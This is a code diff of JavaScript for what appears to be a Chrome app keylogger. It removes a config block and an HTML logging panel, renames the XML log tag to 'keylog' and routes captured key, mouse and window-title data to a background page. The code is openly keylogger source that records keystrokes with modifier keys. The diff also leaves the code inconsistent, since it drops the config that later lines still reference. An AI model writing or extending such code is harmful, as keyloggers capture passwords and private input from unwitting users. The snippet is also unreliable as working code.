@@ -1,23 +1,3 @@
-var __config = {
-    filepath: "C:\Users\nirvana1289\Documents\test.txt",
-    
-    // App window options
-    opt_window: {
-        id: '__LauraKeyloggerWindow',
-        bounds: {
-            width: 400,
-            height: 600,
-            left: 100,
-            top: 100
-        },
-        minWidth: 400,
-        minHeight: 600
-    },
-    
-    // Debug option
-    __debug__: true
-};
-
 // ******** do not edit below this line *********
 
 var __appID = {
@@ -112,57 +92,6 @@ var Keylogger = function() {
         console.log(log);
     }
     
-    // This function is used in real time updating of the panel in Chrome
-    this.logHTML = function() {
-        var html = "<div class''results'>" + '\n';
-        
-        html += "<table>" + '\n';
-        
-        // Time
-        if (this.title != null) {
-            html += "<tr><td colspan='2'><em>" + this.title + "</em></td></tr>"  + '\n';
-        }
-        html += "<tr><td  colspan='2'><strong>Time<strong></td></tr>"  + '\n';
-        html += "<tr>"  + '\n';
-            html += "<td>Epoch</td><td><code>" + this.time.epoch + "</code></td>"  + '\n';
-        html += "</tr><tr>"  + '\n';
-            html += "<td>Locale</td><td><code>" + this.time.obj.toLocaleString() + "</code></td>"  + '\n';
-        html += "</tr>"  + '\n';
-        
-        if (this.mouse != null) {
-            html += "<tr><td colspan='2'><strong>Mouse</strong></td></tr>"  + '\n';
-            html += "<tr>"  + '\n';
-                html += "<td>X</td><td><code>" + this.mouse.x + "</code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Y</td><td><code>" + this.mouse.y + "</code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Event</td><td><code>" + this.mouse.evnt + "</code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Button</td><td><code>" + this.mouse.button + "</code></td>"  + '\n';
-            html += "</tr>"  + '\n';
-        }
-        
-        if (this.keyboard != null) {
-            html += "<tr><td colspan='2'><strong>Keyboard</strong></td></tr>"  + '\n';
-            html += "<tr>"  + '\n';
-                html += "<td>Button</td><td><code>" + this.keyboard.key + " - " + this.keyboard.keyCode + "</code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Ctrl</td><td><code><input type='checkbox' " + (this.keyboard.ctrl ? "checked" : "") + "></input></code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Alt</td><td><code><input type='checkbox' " + (this.keyboard.alt ? "checked" : "") + "></input></code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Shift</td><td><code><input type='checkbox' " + (this.keyboard.shift ? "checked" : "") + "></input></code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Meta</td><td><code><input type='checkbox' " + (this.keyboard.meta ? "checked" : "") + "></input></code></td>"  + '\n';
-            html += "</tr><tr>"  + '\n';
-                html += "<td>Combination</td><td><code>" + this.keyboard.string + "</code></td>"  + '\n';
-            html += "</tr>"  + '\n';
-        }
-        
-        html += "</table></div>";
-        return html;
-    }
-    
     // Return a stringed version of the event... will be implemented better the next days...
     this.logCSV = function() {
         var ret = "";
@@ -171,7 +100,7 @@ var Keylogger = function() {
     
     this.logXML = function() {
         var xml = "";
-        xml += '<event>\n';
+        xml += '<keylog>\n';
             xml += '  <time>' + this.time.epoch + '</time>\n';
             if (this.title != null) {
                 xml += '  <title>' + this.title + '</title>\n';
@@ -182,12 +111,15 @@ var Keylogger = function() {
             if (this.keyboard != null) {
                 xml += '  <keyb ctrl="'+ (this.keyboard.ctrl ? "true" : "false") +'" alt="'+ (this.keyboard.alt ? "true" : "false") +'" shift="'+ (this.keyboard.shift ? "true" : "false") +'" meta="'+ (this.keyboard.meta ? "true" : "false") +'">' + this.keyboard.key + '</keyb>\n'
             }
-        xml += '</event>\n';
+        xml += '</keylog>\n';
         return xml;
     }
     
     this.updateWindow = function() {
-        (chrome.app.window.get(__config.opt_window.id)).contentWindow.document.getElementById("content").innerHTML = this.logHTML();
+        //(chrome.app.window.get(__config.opt_window.id)).contentWindow.document.getElementById("content").innerHTML = this.logHTML();
+        chrome.runtime.getBackgroundPage(function(page) {
+            page.bar(this.get());
+        });
         (chrome.app.window.get(__config.opt_window.id)).contentWindow.document.getElementById("logging").value += this.logXML();
     }
 }
